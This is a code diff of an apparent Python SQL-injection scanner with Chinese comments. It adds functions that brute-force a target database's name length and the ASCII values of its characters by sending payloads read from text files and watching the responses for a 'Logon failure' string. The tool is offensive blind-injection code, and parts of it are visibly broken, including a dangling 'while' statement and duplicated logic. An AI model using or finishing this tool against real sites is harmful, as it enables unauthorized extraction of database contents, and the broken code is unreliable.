@@ -49,9 +49,8 @@ def check_sql(url,method,data,payload):
     elif method =='post':
         result = post(url,data,payload)
 
-        
-
-def scan(url,method,data):
+#爆破数据库长度
+def fuzz_len(url,method,data):
     with open('len.txt','r') as file:
         for payload in file:
             if data==None:
@@ -67,16 +66,57 @@ def scan(url,method,data):
                     if "Logon failure" in result:
                         #print(result)
                         print("数据库的长度为：{}".format(len))
-                        return
+                        return len
+                    payload = payload.replace(str(len),"*")
+                    len+=1
+
+#爆破ascii码值
+def fuzz_size(url,len,method,data):
+    with open('size.txt','r') as file:
+        for payload in file:
+            if data==None:
+                data =''
+            time = 1
+            if method =='get':
+                result = get(url,payload)
+            elif method =='post':
+                while time <= len:
+                    payload = payload.replace("len",str(time))
+                    while 
+                    result = post(url,payload,data)
+
+
+
+        
+
+def scan(url,method,data):
+    fuzz_len(url,method,data)
+
+    with open('len.txt','r') as file:
+        for payload in file:
+            if data==None:
+                data =''
+            len = 1
+            if method =='get':
+                result = get(url,payload)
+            elif method =='post':
+                #猜数据库长度
+                while len<20:
+                    payload = payload.replace("*",str(len))
+                    result = post(url,payload,data)
+                    if "Logon failure" in result:
+                        #print(result)
+                        print("数据库的长度为：{}".format(len))
+                        break
                     payload = payload.replace(str(len),"*")
                     len+=1
                 
             
             #判断是否存在注入
-            check_sql(url,method,data,payload)
+            #check_sql(url,method,data,payload)
             #搜索数据
-            result = search_data(result)
-            print(result)
+            #result = search_data(result)
+            #print(result)
 
 
 def main():
